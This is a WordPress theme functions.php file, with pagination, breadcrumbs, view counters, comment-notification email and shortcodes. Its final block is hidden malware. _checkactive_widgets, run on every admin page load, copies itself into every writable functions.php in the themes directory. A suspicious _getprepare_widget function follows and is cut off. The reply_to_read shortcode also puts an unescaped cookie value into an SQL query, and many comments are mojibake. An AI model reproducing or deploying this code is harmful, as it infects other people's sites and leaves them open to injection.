<?php
// Declare sidebar widget zone
    if (function_exists('register_sidebar')) {
    	register_sidebar(array(
    		'name' => 'Sidebar Widgets',
    		'id'   => 'sidebar-widgets',
    		'description'   => 'These are widgets for the sidebar.',
    		'before_widget' => '<div id="%1$s" class="widget %2$s">',
    		'after_widget'  => '</div>',
    		'before_title'  => '<h2>',
    		'after_title'   => '</h2>'
    	));
    }

//PhÃ¢n trang
function hals_page() {
    $currentPage = null;
    $totalPage = null;
    global $wp_query;
    $currentPage = intval(get_query_var('paged'));
    if(empty($currentPage)) {
        $currentPage = 1;
    }
    $totalPage = intval(ceil($wp_query->found_posts / intval(get_query_var('posts_per_page'))));
    if($totalPage <= 1) {
        return '';
    }
    $paginateResult = '<div class="navigation" style="border-top: 1px solid #ECEFF0;">';
 
    if ($currentPage > 1) {
        $paginateResult .= '<a class="prev page-numbers" href="'.get_pagenum_link($currentPage - 1).'">&laquo;</a>';
    }
    $paginateResult .= ListLink(1, $totalPage, $currentPage);
 
    if ($currentPage < $totalPage) {
        $paginateResult .= "<a href='" . get_pagenum_link($currentPage + 1) . "' class='next page-numbers'>&raquo;</a>";
    }
    $paginateResult .= "</div>";
    echo $paginateResult;
    return $paginateResult;
}
 
function ListLink($intStart, $totalPage, $currentPage) {
    $pageHidden = '<span class="page-numbers dots">...</span>';
    $linkResult = "";
    $hiddenBefore = false;
    $hiddenAfter = false;
    for ($i = $intStart; $i <= $totalPage; $i++) {
        if($currentPage === intval($i)) {
            $linkResult .= '<span class="page-numbers current">'.$i.'</span>';
        }
        else if(($i <= 6 && $currentPage < 10) || $i == $totalPage || $i == 1 || $i < 4 || ($i <= 6 && $totalPage <= 6) || ($i > $currentPage && ($i <= ($currentPage + 2))) || ($i < $currentPage && ($i >= ($currentPage - 2))) || ($i >= ($totalPage - 2) && $i < $totalPage)) {
            $linkResult .= '<a class="page-numbers" href="'.get_pagenum_link($i).'">'.$i.'</a>';
            if($i <= 6 && $currentPage < 10) {
                $hiddenBefore = true;
            }
        }
        else {
            if(!$hiddenBefore) {
                $linkResult .= $pageHidden;
                $hiddenBefore = true;
            }
            else if(!$hiddenAfter && $i > $currentPage) {
                $linkResult .= $pageHidden;
                $hiddenAfter = true;
            }
        }
    }
    return $linkResult;
}


///hien thi bai viet mot chuyen muc cu the
function chia_cat($cat) { 
global $post;
?>
<div class="BlogList hieuung">
<div class="nav"><i class="fa fa-smile-o"></i> <?php echo get_cat_name($cat); ?></div>
<?php query_posts(array('showposts' => 5, 'cat' => $cat )); ?>
<?php if (have_posts()) : while (have_posts()) : the_post(); ?>
<div class="labelfirstposts">
<div class="imagebv">
<a href="<?php the_permalink();?>" title="<?php the_title();?>">
<img width="70" height="70" src="<?php echo my_image_display(); ?>" class="thumb wp-post-image" alt="<?php the_title();?>" title="<?php the_title();?>" /></a></div>
<div class="tenbaiviet"><h2><a href="<?php the_permalink();?>" title="<?php the_title();?>"><?php the_title();?></a></h2></div>
<div class="game-title" style="margin-top: 5px;"><span class="item">
	Hỗ trợ <?php if(get_post_meta($post->ID, 'z_hotroandroid', true)): ?>
<i class="fa fa-android" style="color:#86c620"></i>
<?php endif; ?>
<?php if(get_post_meta($post->ID, 'z_hotroios', true)): ?>
<i class="fa fa-apple" style="color:#040505"></i>
<?php endif; ?>
<?php if(get_post_meta($post->ID, 'z_hotrojava', true)): ?>
<i class="fa fa-java" style="color:#86c620"></i>
<?php endif; ?>																		</span>		
<?php if(get_post_meta($post->ID, 'z_link_download', true)): ?>
<a href="<?php echo get_post_meta($post->ID, 'z_link_download', true); ?>" rel="nofollow" class="re_download">&nbsp;</a>    <?php endif; ?>
</div>
<div class="benduoi">
<span class="column">
<?php if(get_post_meta($post->ID, 'z_kichthuoc', true)): ?>
<span class="ico-app-size"></span>  <span class="info_items_val"><?php echo get_post_meta($post->ID, 'z_kichthuoc', true); ?></span>
<?php endif; ?> - <span class="ico-app-down"></span> <span class="info_items_val"><?php echo getPostViews(get_the_ID()); ?></span></span>
</div>
			<div class="clear"></div>					
			</div>
<?php endwhile; ?>
<?php endif; ?>
<?php wp_reset_query(); ?>
	<div class="vapkxemthem">
	<a href="<?php echo get_category_link($cat); ?>" title="<?php echo get_cat_name( $cat ); ?>">Xem thêm</a>
	</div>
    </div>  
<?php }
//Get áº£nh thumb
function my_image_display($size = 'full') {	
	if (has_post_thumbnail()) {
	$image_id = get_post_thumbnail_id();
	$image_url = wp_get_attachment_image_src($image_id, $size);
	$image_url = $image_url[0];	
	} else {
			global $post, $posts;
			$image_url = '';
			ob_start();
			ob_end_clean();
			$output = preg_match('/<img(.*?)src="(.*?)"/i', $post->post_content, $matches);
			$image_url = $matches[2];
			if(empty($image_url)){
			$image_url = "http://lh3.ggpht.com/--Z8SVBQZ4X8/TdDxPVMl_sI/AAAAAAAAAAA/jhAgjCpZtRQ/no-image.png";
		}
	}
	return $image_url;
}

//Box Content
include_once('box_content.php');
register_sidebar(array(
	'id'            => 'index-content',
	'name'          => 'Index Content',
	'before_widget' => '<div>',
	'after_widget' => '</div>',
	'before_title' => '<div class="phdr"><h2>',
	'after_title' => '</h2></div>',
 ));
function my_get_highest_parent( $id ) {
			$cat = get_category( $id );
			$parent = $cat->parent;
				
			if( $parent == 0 ) 
			{
				//if($cat->name!='Featured')
				//{
					return $id;
				//}
			}
			else
				my_get_highest_parent( $parent );
}
/**************** MetaBox  ****************/
include_once('includes/metabox.php');
/********TimeAgo****/
function timeago( $type = 'post' ) {
$d = 'comment' == $type ? 'get_comment_time' : 'get_post_time';
return human_time_diff($d('U'), current_time('timestamp')) . " " . __(' trÆ°á»›c.');
}
/**************** áº¢nh TiÃªu Biá»ƒu - Feature Images ****************/
function get_first_image() {
		global $post, $posts;
		$first_img = '';
		ob_start();
		ob_end_clean();
		$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
		$first_img = $matches [1] [0];
		if(empty($first_img)){
			$first_img = get_bloginfo('template_directory')."/images/noimages.png";
		}
		return $first_img;
}
// Shortcodes
include_once('shortcodes.php');
function emm_paginate($args = null) {
$defaults = array(
'page' => null, 'pages' => null,
'range' => 3, 'gap' => 3, 'anchor' => 1,
'before' => '<div class="emm-paginate">', 'after' => '</div>',
'title' => __('Pages:'),
'nextpage' => __('&raquo;'), 'previouspage' => __('&laquo'),
'echo' => 1
);
$r = wp_parse_args($args, $defaults);
extract($r, EXTR_SKIP);
if (!$page && !$pages) {
global $wp_query;
$page = get_query_var('paged');
$page = !empty($page) ? intval($page) : 1;
$posts_per_page = intval(get_query_var('posts_per_page'));
$pages = intval(ceil($wp_query->found_posts / $posts_per_page));
}
$output = "";
if ($pages > 1) {
$output .= "$before<span class='emm-title'>$title</span>";
$ellipsis = "<span class='emm-gap'>...</span>";
if ($page > 1 && !empty($previouspage)) {
$output .= "<a href='" . get_pagenum_link($page - 1) . "' class='emm-prev'>$previouspage</a>";
}
$min_links = $range * 2 + 1;
$block_min = min($page - $range, $pages - $min_links);
$block_high = max($page + $range, $min_links);
$left_gap = (($block_min - $anchor - $gap) > 0) ? true : false;
$right_gap = (($block_high + $anchor + $gap) < $pages) ? true : false;
if ($left_gap && !$right_gap) {
$output .= sprintf('%s%s%s',
emm_paginate_loop(1, $anchor),
$ellipsis,
emm_paginate_loop($block_min, $pages, $page)
);
}
else if ($left_gap && $right_gap) {
$output .= sprintf('%s%s%s%s%s',
emm_paginate_loop(1, $anchor),
$ellipsis,
emm_paginate_loop($block_min, $block_high, $page),
$ellipsis,
emm_paginate_loop(($pages - $anchor + 1), $pages)
);
}
else if ($right_gap && !$left_gap) {
$output .= sprintf('%s%s%s',
emm_paginate_loop(1, $block_high, $page),
$ellipsis,
emm_paginate_loop(($pages - $anchor + 1), $pages)
);
}
else {
$output .= emm_paginate_loop(1, $pages, $page);
}
if ($page < $pages && !empty($nextpage)) {
$output .= "<a href='" . get_pagenum_link($page + 1) . "' class='emm-next'>$nextpage</a>";
}
$output .= $after;
}
if ($echo) {
echo $output;
}
return $output;
}
function emm_paginate_loop($start, $max, $page = 0) {
$output = "";
for ($i = $start; $i <= $max; $i++) {
$output .= ($page === intval($i))
? "<span class='emm-page emm-current'>$i</span>"
: "<a href='" . get_pagenum_link($i) . "' class='emm-page'>$i</a>";
}
return $output;
}
/***************** Chia Category Trang Chá»§ *****************/
function chia_category($cat) { ?>
<div class="thead">
		<h1><?php echo get_cat_name( $cat ); ?></h1>
</div>
			<?php query_posts(array('showposts' => 8, 'cat' => $cat )); ?>
			<?php if (have_posts()) : while (have_posts()) : the_post(); ?>
			<h2 class="bai">
				<a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
			</h2>
			<?php endwhile; ?>
			<?php else : ?>
				<p>ChÆ°a cÃ³ bÃ i viáº¿t.</p>
			<?php endif; ?>
			<?php wp_reset_query(); ?>
			
<!-- End .postBox -->
<?php }
function dimox_breadcrumbs() {
 
  $delimiter = '»';
  $home = 'Home'; // chá»¯ thay tháº¿ cho pháº§n 'Home' link
  $before = ''; // tháº» html Ä‘áº±ng trÆ°á»›c má»—i link
 $after = ''; // tháº» Ä‘áº±ng sau má»—i link
 
  if ( !is_home() && !is_front_page() || is_paged() ) {
 
    echo '</pre>
<div class="bread baimoi">';
 
 global $post;
 $homeLink = get_bloginfo('url');
 echo '<a href="' . $homeLink . '">' . $home . '</a> ' . $delimiter . ' ';
 
 if ( is_category() ) {
 global $wp_query;
 $cat_obj = $wp_query->get_queried_object();
 $thisCat = $cat_obj->term_id;
 $thisCat = get_category($thisCat);
 $parentCat = get_category($thisCat->parent);
 if ($thisCat->parent != 0) echo(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
 echo $before . 'Archive by category "' . single_cat_title('', false) . '"' . $after;
 
 } elseif ( is_day() ) {
 echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
 echo '<a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a> ' . $delimiter . ' ';
 echo $before . get_the_time('d') . $after;
 
 } elseif ( is_month() ) {
 echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
 echo $before . get_the_time('F') . $after;
 
 } elseif ( is_year() ) {
 echo $before . get_the_time('Y') . $after;
 
 } elseif ( is_single() && !is_attachment() ) {
 if ( get_post_type() != 'post' ) {
 $post_type = get_post_type_object(get_post_type());
 $slug = $post_type->rewrite;
 echo '<a href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a> ' . $delimiter . ' ';
 echo $before . get_the_title() . $after;
 } else {
 $cat = get_the_category(); $cat = $cat[0];
 echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
 echo $before . get_the_title() . $after;
 }
 
 } elseif ( !is_single() && !is_page() && get_post_type() != 'post' && !is_404() ) {
 $post_type = get_post_type_object(get_post_type());
 echo $before . $post_type->labels->singular_name . $after;
 
 } elseif ( is_attachment() ) {
 $parent = get_post($post->post_parent);
 $cat = get_the_category($parent->ID); $cat = $cat[0];
 echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
 echo '<a href="' . get_permalink($parent) . '">' . $parent->post_title . '</a> ' . $delimiter . ' ';
 echo $before . get_the_title() . $after;
 
 } elseif ( is_page() && !$post->post_parent ) {
 echo $before . get_the_title() . $after;
 
 } elseif ( is_page() && $post->post_parent ) {
 $parent_id = $post->post_parent;
 $breadcrumbs = array();
 while ($parent_id) {
 $page = get_page($parent_id);
 $breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
 $parent_id = $page->post_parent;
 }
 $breadcrumbs = array_reverse($breadcrumbs);
 foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';
 echo $before . get_the_title() . $after;
 
 } elseif ( is_search() ) {
 echo $before . 'Search results for "' . get_search_query() . '"' . $after;
 
 } elseif ( is_tag() ) {
 echo $before . 'Posts tagged "' . single_tag_title('', false) . '"' . $after;
 
 } elseif ( is_author() ) {
 global $author;
 $userdata = get_userdata($author);
 echo $before . 'Articles posted by ' . $userdata->display_name . $after;
 
 } elseif ( is_404() ) {
 echo $before . 'Error 404' . $after;
 }
 
 if ( get_query_var('paged') ) {
 if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
 echo __('Page') . ' ' . get_query_var('paged');
 if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
 }
 
 echo '</div>';
 
  }
} // end dimox_breadcrumbs()


if ( function_exists( 'add_theme_support' ) ) {
add_theme_support( 'post-thumbnails' );
set_post_thumbnail_size( 30, 30, true );
}

//å�–æ¶ˆåŠ è½½l10nçš„js
wp_deregister_script('l10n');

//æ·»åŠ è‡ªå®šä¹‰è�œå�•æ”¯æŒ�
add_theme_support('nav-menus');
register_nav_menus( array(
        'main_top' => __( 'Menu chÃ­nh á»Ÿ trÃªn'),
) );


//ç¦�ç”¨æ— è§…ç›¸å…³æ–‡ç« æ�’ä»¶çš„JS
if (class_exists('WumiiRelatedPosts')) {
    global $wumii_related_posts;
    if (is_object($wumii_related_posts)) {
        remove_action('wp_head', array($wumii_related_posts, 'echoVerificationMeta'));
        remove_action('wp_footer', array($wumii_related_posts, 'echoWumiiScript'));
        remove_action('the_content', array($wumii_related_posts, 'addWumiiContent'));
    }
}


//ç¦�ç”¨Some Chinese Please!çš„js
if(function_exists('scp_front')){
    remove_action('wp', 'scp_front');
}

//å®žçŽ°å½©è‰²æ ‡ç­¾äº‘
function colorCloud($text) {
    $text = preg_replace_callback('|<a (.+?)>|i', 'colorCloudCallback', $text);
    return $text;
}

function colorCloudCallback($matches) {
    $text = $matches [1];
    $color = dechex(rand(0, 16777215));
    $pattern = '/style=(\'|\")(.*)(\'|\")/i';
    $text = preg_replace($pattern, "style=\"color:#{$color};$2;\"", $text);
    return "<a $text>";
}

add_filter('wp_tag_cloud', 'colorCloud', 1);

//åˆ¤æ–­æ—¥å¿—æ˜¯å�¦ä¸ºæœ€æ–°æ—¥å¿—(1å¤©å†…)
function is_new_post() {
    global $post;
    $post_time = strtotime($post->post_date);
    $time = time();
    $diff = ($time - $post_time) / 86400;
    if ($diff < 1) {
        return TRUE;
    } else {
        return FALSE;
    }
}

//ä¸­æ–‡æˆªæ–­
function messense_cut_str($string, $sublen, $start = 0, $code = 'UTF-8') { //ä¸­æ–‡æˆªæ–­ä¸“ç”¨å‡½æ•°
    if ($code == 'UTF-8') {
        $pa = "/[\x01-\x7f]|[\xc2-\xdf][\x80-\xbf]|\xe0[\xa0-\xbf][\x80-\xbf]|[\xe1-\xef][\x80-\xbf][\x80-\xbf]|\xf0[\x90-\xbf][\x80-\xbf][\x80-\xbf]|[\xf1-\xf7][\x80-\xbf][\x80-\xbf][\x80-\xbf]/";
        preg_match_all($pa, $string, $t_string);
        if (count($t_string [0]) - $start > $sublen)
            return join('', array_slice($t_string [0], $start, $sublen));
        return join('', array_slice($t_string [0], $start, $sublen));
    } else {
        $start = $start * 2;
        $sublen = $sublen * 2;
        $strlen = strlen($string);
        $tmpstr = '';
        for ($i = 0; $i < $strlen; $i++) {
            if ($i >= $start && $i < ($start + $sublen)) {
                if (ord(substr($string, $i, 1)) > 129)
                    $tmpstr .= substr($string, $i, 2);
                else
                    $tmpstr .= substr($string, $i, 1);
            }
            if (ord(substr($string, $i, 1)) > 129)
                $i++;
        }
        return $tmpstr;
    }
}

//ä»¥ä¸‹æ˜¯éƒ¨åˆ†SEOä¼˜åŒ–,é¡µé�¢æ��è¿°å’Œå…³é”®è¯�
function messense_description($echo = TRUE) {
    $description = get_bloginfo('description');
    if (is_single()) {
        global $post;
        if ($post->post_excerpt) {
            $description = $post->post_excerpt;
        } elseif (get_post_meta($post->ID, 'description', true)) {
            $description = get_post_meta($post->ID, 'description', true);
        } else {
            $description = messense_cut_str(strip_tags($post->post_content), 100); //æˆªå�–æ–‡ç« å†…å®¹çš„å‰�100ä¸ªå­—ä½œä¸ºé¡µé�¢æ��è¿°
        }
    }
    if ($echo) {
        echo $description;
    } else {
        return $description;
    }
}

function messense_keywords($echo = TRUE) {
    $keywords = 'messense,ä¹±äº†æ„Ÿè§‰,php,java,wap,wapå¼€å�‘,wordpress,éŸ³ä¹�,æŠ˜è…¾,å¿ƒæƒ…,ä¸»é¢˜,æ¨¡æ�¿';
    if (is_single()) {
        global $post;
        if (get_post_meta($post->ID, 'keywords', true)) {
            $keywords = get_post_meta($post->ID, 'keywords', true);
        } else {
            $tags = wp_get_post_tags($post->ID);
            if ($tags) {
                $keywords = '';
                foreach ($tags as $tag) {
                    $keywords = $keywords . $tag->name . ',';
                }
                $keywords = substr($keywords, 0, - 1); //åŽ»é™¤æœ€å�Žä¸€ä¸ªå…³é”®å­—å�Žçš„å�Šè§’é€—å�·
            }
        }
    }
    if ($echo) {
        echo $keywords;
    } else {
        return $keywords;
    }
}

function pageCount() {
    global $posts_per_page, $query_string;
    $query = new WP_Query($query_string . '&posts_per_page=-1');
    $total = $query->post_count;
    unset($query);
    return ceil($total / $posts_per_page);
}

//æ•°å­—åˆ†é¡µå¯¼èˆª
function messense_pagination() {
    global $posts_per_page, $paged, $query_string;
    $my_query = new WP_Query($query_string . '&posts_per_page=-1');
    $total_posts = $my_query->post_count;
    if (empty($paged))
        $paged = 1;
    $prev = $paged - 1;
    $next = $paged + 1;
    $range = 2;
    $showitems = ($range * 2) + 1;
    $pages = ceil($total_posts / $posts_per_page);
    if ($pages != 1) {
        echo ($paged > 2 && $paged + $range + 1 > $pages && $showitems < $pages) ? "<a href=\"" . get_pagenum_link(1) . "\" title=\"<<\"><<</a>" : "";
        echo ($paged > 1 && $showitems < $pages) ? "<a href=\"" . get_pagenum_link($prev) . "\" title=\"<\"><</a>" : "";
        for ($i = 1; $i <= $pages; $i++) {
            if (!($i >= $paged + $range + 1 || $i <= $paged - $range - 1) || $pages <= $showitems) {
                echo ($paged == $i) ? "<span class=\"current\">{$i}</span>" : "<a href=\"" . get_pagenum_link($i) . "\" title=\"ç¬¬{$i}é¡µ\" class=\"inactive\">{$i}</a>";
            }
        }
        echo ($paged < $pages - 1 && $showitems < $pages) ? "<a href=\"" . get_pagenum_link($next) . "\" title=\">\">></a>" : "";
        echo ($paged < $pages - 1 && $paged + $range - 1 < $pages && $showitems < $pages) ? "<a href=\"" . get_pagenum_link($pages) . "\" title=\">>\">>></a>" : "";
    }
}

function my_smilies_src($img_src, $img, $siteurl) {
    return get_bloginfo('template_directory') . '/images/smilies/' . $img;
}

add_filter('smilies_src', 'my_smilies_src', 1, 10);

function no_self_ping(&$links) {
    $home = get_option('home');
    foreach ($links as $l => $link)
        if (0 === strpos($link, $home))
            unset($links[$l]);
}

add_action('pre_ping', 'no_self_ping');

function comment_mail_notify($comment_id) {
    $admin_notify = '0';
    $admin_email = 'wapdevelop@gmail.com';
    $comment = get_comment($comment_id);
    $comment_author_email = trim($comment->comment_author_email);
    $parent_id = $comment->comment_parent ? $comment->comment_parent : '';
    global $wpdb;
    if ($wpdb->query("Describe {$wpdb->comments} comment_mail_notify") == '')
        $wpdb->query("ALTER TABLE {$wpdb->comments} ADD COLUMN comment_mail_notify TINYINT NOT NULL DEFAULT 0;");
    if (($comment_author_email != $admin_email && isset($_POST['comment_mail_notify'])) || ($comment_author_email == $admin_email && $admin_notify == '1'))
        $wpdb->query("UPDATE {$wpdb->comments} SET comment_mail_notify='1' WHERE comment_ID='$comment_id'");
    $notify = $parent_id ? get_comment($parent_id)->comment_mail_notify : '0';
    $spam_confirmed = $comment->comment_approved;
    if ($parent_id != '' && $spam_confirmed != 'spam' && $notify == '1') {
        $wp_email = 'wapdevelop@gmail.com';
        $to = trim(get_comment($parent_id)->comment_author_email);
        $subject = 'Messense.Me å�‘æ‚¨å�‘æ�¥è¢«å›´è§‚é€šçŸ¥ï¼�';
        $message = '
<div style="margin:1em 40px 1em 40px;background-color:#eef2fa;border:1px solid #d8e3e8;color:#111;padding:0 15px;font-family:Microsoft YaHei,Verdana;font-size:12.5px;">
<p><strong>@' . trim(get_comment($parent_id)->comment_author) . '</strong> ç«¥éž‹ï¼Œæ‚¨åœ¨ <strong>ã€Š' . get_the_title($comment->comment_post_ID) . 'ã€‹</strong> ä¸Šçš„è¯„è®ºè¢«å›´è§‚äº†ï¼�</p>
</div>
<div style="margin:1em 40px 1em 40px;background-color:#eef2fa;border:1px solid #d8e3e8;color:#111;padding:0 15px;font-family:Microsoft YaHei,Verdana;font-size:12.5px;">
<p><strong>æ‚¨</strong> è¯´: ' . trim(get_comment($parent_id)->comment_content) . '</p>
<p><strong>' . trim($comment->comment_author) . '</strong> å›ž: ' . trim($comment->comment_content) . '</p>
<p><small><em>å��å›´è§‚ï¼Œè¯·çŒ›å‡»ï¼š <a href="' . htmlspecialchars(get_permalink($comment->comment_post_ID) . "#comment-" . $comment->comment_ID) . '">' . htmlspecialchars(get_permalink($comment->comment_post_ID) . "#comment-" . $comment->comment_ID) . '</a></em></small></p>
<p style="float:right"><strong> â€”â€” By <a href="http://messense.me">Messense.Me</a></strong></p>
</div>
';
        $message = convert_smilies($message);
        $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
        $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
        wp_mail($to, $subject, $message, $headers);
    }
}

add_action('comment_post', 'comment_mail_notify');

function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count.' ';
}
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

















//çŸ­ä»£ç �[login]ï¼Œç™»å½•å�¯è§�å†…å®¹
function login_to_read($atts, $content=null) {
    extract(shortcode_atts(array("notice" => '<p class="login-to-read">æ¸©é¦¨æ��ç¤º: æ­¤å¤„å†…å®¹éœ€è¦�<a href="' . wp_login_url(get_permalink()) . '" title="ç™»å½•">ç™»å½•</a>å�Žæ‰�èƒ½æŸ¥çœ‹.</p>'), $atts));
    if (is_user_logged_in()) {
        return $content;
    } else {
        return $notice;
    }
}

add_shortcode('login', 'login_to_read');

//çŸ­ä»£ç �[reply]ï¼Œè¯„è®ºå�¯è§�å†…å®¹
function reply_to_read($atts, $content=null) {
    extract(shortcode_atts(array("notice" => '<p class="reply-to-read">æ¸©é¦¨æ��ç¤º: æ­¤å¤„å†…å®¹éœ€è¦�<a href="' . get_permalink() . '#respond" title="è¯„è®ºæœ¬æ–‡">è¯„è®ºæœ¬æ–‡</a>å�Žæ‰�èƒ½æŸ¥çœ‹.</p>'), $atts));
    $email = null;
    $user_ID = (int) wp_get_current_user()->ID;
    if ($user_ID > 0) {
        $email = get_userdata($user_ID)->user_email;
    } else if (isset($_COOKIE['comment_author_email_' . COOKIEHASH])) {
        $email = str_replace('%40', '@', $_COOKIE['comment_author_email_' . COOKIEHASH]);
    } else {
        return $notice;
    }
    if (empty($email)) {
        return $notice;
    }
    global $wpdb;
    $post_id = get_the_ID();
    $query = "SELECT `comment_ID` FROM {$wpdb->comments} WHERE `comment_post_ID`={$post_id} and `comment_approved`='1' and `comment_author_email`='{$email}' LIMIT 1";
    if ($wpdb->get_results($query)) {
        return $content;
    } else {
        return $notice;
    }
}

add_shortcode('reply', 'reply_to_read');

// Custom Comments List.
function mytheme_comment($comment, $args, $depth) {
    $GLOBALS['comment'] = $comment;
    //ä¸»è¯„è®ºè®¡æ•°å™¨åˆ�å§‹åŒ– begin - by zwwooooo
    global $commentcount;
    if (!$commentcount) { //åˆ�å§‹åŒ–æ¥¼å±‚è®¡æ•°å™¨
        $page = (!empty($in_comment_loop) ) ? get_query_var('cpage') : get_page_of_comment($comment->comment_ID, $args); //zww
        if(isset($args['per_page']) && $args['per_page']>0){
            $cpp=$args['per_page'];
        }else{
            $cpp = get_option('comments_per_page'); //èŽ·å�–æ¯�é¡µè¯„è®ºæ˜¾ç¤ºæ•°é‡�
        }
        if ($page > 1) {
            $commentcount = $cpp * ($page - 1);
        } else {
            $commentcount = 0; //å¦‚æžœè¯„è®ºè¿˜æ²¡æœ‰åˆ†é¡µï¼Œåˆ�å§‹å€¼ä¸º0
        }
    }
    //ä¸»è¯„è®ºè®¡æ•°å™¨åˆ�å§‹åŒ– end - by zwwooooo
    ?>
    <div class="cmm" <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>" <?php if ($depth < 5 && $depth > 1)
        echo ' style="margin-left: ' . ceil(10 / sqrt($depth)) . 'px; "'; ?>>
                                      <?php
                                      //ç”¨äºŽåˆ¤æ–­è¯¥ç•™è¨€çš„IDæ˜¯å�¦ä¸ºç®¡ç�†å‘˜çš„ç•™è¨€
                                      if ($comment->user_id > 0) {
                                          $admin_comment = '<span style="color:#ED539F">' . _e('  ') . '</span>';
                                      } else {
                                          $admin_comment = __(' ');
                                      }
                                      ?>
        <div id="comment-<?php comment_ID() ?>" class="comment-body">
            <?php if ($comment->comment_approved == '0') : ?>
                <em><?php _e('Your comment is awaiting moderation.'); ?></em>
            <?php endif; ?>
            <div class="comment-author vcard"><span class="floor"><?php
                if (!$parent_id = $comment->comment_parent) {
                    printf('%s.', ++$commentcount);
                } elseif ($depth > 1 && $depth < 8) {
                    printf('Pháº£n há»“i', $depth - 1);
                } else {
                    printf('^Heal^');
                }
                    ?></span>
                <?php printf(__('<cite class="fn"><b><font color="red">%s</b></font></cite><span class="says">%s</span>'), get_comment_author_link(), $admin_comment) ?>
                <span class="comment-time">(<?php echo get_comment_date('m-d-y'), ' ', get_comment_time('H:i'); ?>)</span>
                <span class="reply">
                    <a href="?replytocom=<?php comment_ID() ?>#respond" class="comment-reply-link" rel="nofollow">Tráº£ lá»�i</a>
                </span>
            </div>	
            <div class="comment-text"><?php comment_text(); ?></div>
        </div>
</div>
        <?php
    }
    ?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
